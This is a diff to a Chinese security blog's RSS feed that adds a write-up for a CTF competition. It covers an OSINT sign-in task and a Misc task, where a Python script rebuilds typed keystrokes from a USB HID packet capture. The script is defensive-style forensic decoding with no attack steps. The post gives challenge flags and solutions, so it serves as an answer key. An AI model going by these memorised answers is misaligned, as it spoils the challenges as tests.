@@ -12,12 +12,587 @@
     
     <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
     
-    <lastBuildDate>Fri, 18 Sep 2026 14:00:00 +0800</lastBuildDate>
+    <lastBuildDate>Sun, 20 Sep 2026 09:00:00 +0800</lastBuildDate>
     
     
     <atom:link href="https://blog.m15tak3.com/tags/pwn/index.xml" rel="self" type="application/rss&#43;xml" />
     
 
+    
+      
+    
+
+    <item>
+      <title>第一届创宇杯WP</title>
+      <link>https://blog.m15tak3.com/post/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%88%9B%E5%AE%87%E6%9D%AFwp/</link>
+      <pubDate>Sun, 20 Sep 2026 09:00:00 &#43;0800</pubDate>
+      <author>skyman.soul@gmail.com (M15tak3)</author>
+      <guid>https://blog.m15tak3.com/post/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%88%9B%E5%AE%87%E6%9D%AFwp/</guid>
+      <description>
+        <![CDATA[<h1>第一届创宇杯WP</h1><p>作者：M15tak3（skyman.soul@gmail.com）</p>
+        
+          <h1 id="第一届创宇杯wp">
+<a class="header-anchor" href="#%e7%ac%ac%e4%b8%80%e5%b1%8a%e5%88%9b%e5%ae%87%e6%9d%afwp"></a>
+第一届创宇杯WP
+</h1><h2 id="osint">
+<a class="header-anchor" href="#osint"></a>
+OSINT
+</h2><h3 id="签到">
+<a class="header-anchor" href="#%e7%ad%be%e5%88%b0"></a>
+签到
+</h3><h4 id="思路">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
+思路
+</h4><p>题目给出了一段 Base64 数据。解码后可得到一张二维码；扫描二维码进入指定公众号，再完成其中的小游戏即可获得 flag。</p>
+<h4 id="flag">
+<a class="header-anchor" href="#flag"></a>
+flag
+</h4><p><code>flag{1dbc1e04-5de9-4dac-a8ae-5343dc2f04a5}</code></p>
+<h2 id="misc">
+<a class="header-anchor" href="#misc"></a>
+Misc
+</h2><h3 id="截获">
+<a class="header-anchor" href="#%e6%88%aa%e8%8e%b7"></a>
+截获
+</h3><h4 id="思路-1">
+<a class="header-anchor" href="#%e6%80%9d%e8%b7%af-1"></a>
+思路
+</h4><p>题目给了一个流量包，放进wireshark打开先查看抓包文件的基本信息，可以发现接口名为usbmon0，链路层类型是USB Linux mmapped。PCAPNG中大部分USBMon事件没有有效键盘数据。关键数据出现在72字节左右的包尾部：最后8字节符合USB HID键盘报告格式。
+在尝试过滤72字节的包的时候，发现过滤出大量包包，因此考虑还是使用脚本来处理。</p>
+<p>脚本思路：</p>
+<ol>
+<li>解析PCAPNG文件结构，逐个读取Enhanced Packet Block，拿到每个USBMon包的原始payload。</li>
+<li>筛选疑似HID键盘包：本题里有效包长度大于等于72字节，最后8字节就是USB HID keyboard report。</li>
+<li>按HID键盘格式解析report</li>
+<li>脚本维护当前光标位置、CapsLock、NumLock、上一次按下的键，用来判断哪些键是新按下的。</li>
+<li>普通字母数字按HID表转换，同时处理Shift、CapsLock、小键盘数字。</li>
+<li>遇到Backspace就删除前一个字符，遇到左右方向键就移动光标，遇到CapsLock / NumLock就切换状态。</li>
+<li>拼出完整输入文本</li>
+</ol>
+<h4 id="完整脚本">
+<a class="header-anchor" href="#%e5%ae%8c%e6%95%b4%e8%84%9a%e6%9c%ac"></a>
+完整脚本
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PCAPNG_FILE</span> <span class="o">=</span> <span class="s2">&#34;flag.pcapng&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">NORMAL_KEYS</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x04</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">),</span> <span class="mh">0x05</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;B&#39;</span><span class="p">),</span> <span class="mh">0x06</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;C&#39;</span><span class="p">),</span> <span class="mh">0x07</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;D&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x08</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;e&#39;</span><span class="p">,</span> <span class="s1">&#39;E&#39;</span><span class="p">),</span> <span class="mh">0x09</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="p">,</span> <span class="s1">&#39;F&#39;</span><span class="p">),</span> <span class="mh">0x0a</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;g&#39;</span><span class="p">,</span> <span class="s1">&#39;G&#39;</span><span class="p">),</span> <span class="mh">0x0b</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;h&#39;</span><span class="p">,</span> <span class="s1">&#39;H&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x0c</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;I&#39;</span><span class="p">),</span> <span class="mh">0x0d</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;j&#39;</span><span class="p">,</span> <span class="s1">&#39;J&#39;</span><span class="p">),</span> <span class="mh">0x0e</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;k&#39;</span><span class="p">,</span> <span class="s1">&#39;K&#39;</span><span class="p">),</span> <span class="mh">0x0f</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;l&#39;</span><span class="p">,</span> <span class="s1">&#39;L&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x10</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span> <span class="s1">&#39;M&#39;</span><span class="p">),</span> <span class="mh">0x11</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;n&#39;</span><span class="p">,</span> <span class="s1">&#39;N&#39;</span><span class="p">),</span> <span class="mh">0x12</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;o&#39;</span><span class="p">,</span> <span class="s1">&#39;O&#39;</span><span class="p">),</span> <span class="mh">0x13</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;P&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x14</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;Q&#39;</span><span class="p">),</span> <span class="mh">0x15</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="s1">&#39;R&#39;</span><span class="p">),</span> <span class="mh">0x16</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;S&#39;</span><span class="p">),</span> <span class="mh">0x17</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;t&#39;</span><span class="p">,</span> <span class="s1">&#39;T&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x18</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;u&#39;</span><span class="p">,</span> <span class="s1">&#39;U&#39;</span><span class="p">),</span> <span class="mh">0x19</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;v&#39;</span><span class="p">,</span> <span class="s1">&#39;V&#39;</span><span class="p">),</span> <span class="mh">0x1a</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="s1">&#39;W&#39;</span><span class="p">),</span> <span class="mh">0x1b</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">,</span> <span class="s1">&#39;X&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1c</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;y&#39;</span><span class="p">,</span> <span class="s1">&#39;Y&#39;</span><span class="p">),</span> <span class="mh">0x1d</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">,</span> <span class="s1">&#39;Z&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1e</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;!&#39;</span><span class="p">),</span> <span class="mh">0x1f</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;@&#39;</span><span class="p">),</span> <span class="mh">0x20</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">),</span> <span class="mh">0x21</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="s1">&#39;$&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x22</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">,</span> <span class="s1">&#39;%&#39;</span><span class="p">),</span> <span class="mh">0x23</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="p">),</span> <span class="mh">0x24</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;7&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">),</span> <span class="mh">0x25</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;8&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x26</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;9&#39;</span><span class="p">,</span> <span class="s1">&#39;(&#39;</span><span class="p">),</span> <span class="mh">0x27</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;)&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x28</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">),</span> <span class="mh">0x2c</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">),</span> <span class="mh">0x2d</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">),</span> <span class="mh">0x2e</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x2f</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;{&#39;</span><span class="p">),</span> <span class="mh">0x30</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;}&#39;</span><span class="p">),</span> <span class="mh">0x31</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">),</span> <span class="mh">0x33</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x34</span><span class="p">:</span> <span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">),</span> <span class="mh">0x35</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;~&#39;</span><span class="p">),</span> <span class="mh">0x36</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">),</span> <span class="mh">0x37</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x38</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">KEYPAD_NUMLOCK</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x54</span><span class="p">:</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">:</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">:</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">:</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x59</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="mh">0x5a</span><span class="p">:</span> <span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">:</span> <span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">:</span> <span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">:</span> <span class="s1">&#39;5&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x5e</span><span class="p">:</span> <span class="s1">&#39;6&#39;</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">:</span> <span class="s1">&#39;7&#39;</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">:</span> <span class="s1">&#39;8&#39;</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">:</span> <span class="s1">&#39;9&#39;</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">:</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NAV_KEYS</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x4f</span><span class="p">:</span> <span class="s1">&#39;right&#39;</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">:</span> <span class="s1">&#39;left&#39;</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">:</span> <span class="s1">&#39;down&#39;</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">:</span> <span class="s1">&#39;up&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x4a</span><span class="p">:</span> <span class="s1">&#39;home&#39;</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">:</span> <span class="s1">&#39;end&#39;</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">:</span> <span class="s1">&#39;backspace&#39;</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">:</span> <span class="s1">&#39;capslock&#39;</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">:</span> <span class="s1">&#39;numlock&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pcapng_packets</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">off</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;&lt;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">off</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">&lt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">block_type</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="n">endian</span> <span class="o">+</span> <span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">off</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">block_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="n">endian</span> <span class="o">+</span> <span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">off</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">block_len</span> <span class="o">&lt;</span> <span class="mi">12</span> <span class="ow">or</span> <span class="n">off</span> <span class="o">+</span> <span class="n">block_len</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">:</span><span class="n">off</span> <span class="o">+</span> <span class="n">block_len</span> <span class="o">-</span> <span class="mi">4</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">block_type</span> <span class="o">==</span> <span class="mh">0x0A0D0D0A</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bom</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="mi">0</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">endian</span> <span class="o">=</span> <span class="s1">&#39;&lt;&#39;</span> <span class="k">if</span> <span class="n">bom</span> <span class="o">==</span> <span class="mh">0x1A2B3C4D</span> <span class="k">else</span> <span class="s1">&#39;&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">block_type</span> <span class="o">==</span> <span class="mi">6</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cap_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack_from</span><span class="p">(</span><span class="n">endian</span> <span class="o">+</span> <span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">body</span><span class="p">,</span> <span class="mi">12</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="n">body</span><span class="p">[</span><span class="mi">20</span><span class="p">:</span><span class="mi">20</span> <span class="o">+</span> <span class="n">cap_len</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">            <span class="k">yield</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">        <span class="n">off</span> <span class="o">+=</span> <span class="n">block_len</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">extract_hid_reports</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">payload</span> <span class="ow">in</span> <span class="n">pcapng_packets</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">72</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">yield</span> <span class="n">payload</span><span class="p">[</span><span class="o">-</span><span class="mi">8</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">type_char</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">ch</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ch</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buf</span><span class="p">[</span><span class="n">pos</span><span class="p">:</span><span class="n">pos</span><span class="p">]</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pos</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">ch</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_text</span><span class="p">(</span><span class="n">reports</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">caps</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="n">last_keys</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">report</span> <span class="ow">in</span> <span class="n">reports</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">modifier</span> <span class="o">=</span> <span class="n">report</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">shift</span> <span class="o">=</span> <span class="nb">bool</span><span class="p">(</span><span class="n">modifier</span> <span class="o">&amp;</span> <span class="mh">0x22</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">keys</span> <span class="o">=</span> <span class="p">{</span><span class="n">k</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">report</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span> <span class="k">if</span> <span class="n">k</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_keys</span> <span class="o">=</span> <span class="n">keys</span> <span class="o">-</span> <span class="n">last_keys</span>
+</span></span><span class="line"><span class="cl">        <span class="n">last_keys</span> <span class="o">=</span> <span class="n">keys</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">new_keys</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x39</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">caps</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">caps</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x53</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">num</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">num</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x2a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">pos</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">del</span> <span class="n">buf</span><span class="p">[</span><span class="n">pos</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">pos</span> <span class="o">-=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x4f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pos</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x50</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pos</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">pos</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x4a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">key</span> <span class="o">==</span> <span class="mh">0x4d</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pos</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">NORMAL_KEYS</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">lo</span><span class="p">,</span> <span class="n">hi</span> <span class="o">=</span> <span class="n">NORMAL_KEYS</span><span class="p">[</span><span class="n">key</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">lo</span><span class="o">.</span><span class="n">isalpha</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">ch</span> <span class="o">=</span> <span class="n">hi</span> <span class="k">if</span> <span class="p">(</span><span class="n">shift</span> <span class="o">^</span> <span class="n">caps</span><span class="p">)</span> <span class="k">else</span> <span class="n">lo</span>
+</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">ch</span> <span class="o">=</span> <span class="n">hi</span> <span class="k">if</span> <span class="n">shift</span> <span class="k">else</span> <span class="n">lo</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pos</span> <span class="o">=</span> <span class="n">type_char</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">ch</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">num</span> <span class="ow">and</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">KEYPAD_NUMLOCK</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pos</span> <span class="o">=</span> <span class="n">type_char</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">pos</span><span class="p">,</span> <span class="n">KEYPAD_NUMLOCK</span><span class="p">[</span><span class="n">key</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">NAV_KEYS</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">text</span> <span class="o">=</span> <span class="n">recover_text</span><span class="p">(</span><span class="n">extract_hid_reports</span><span class="p">(</span><span class="n">PCAPNG_FILE</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;flag\{[^}]+\}&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">flag</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
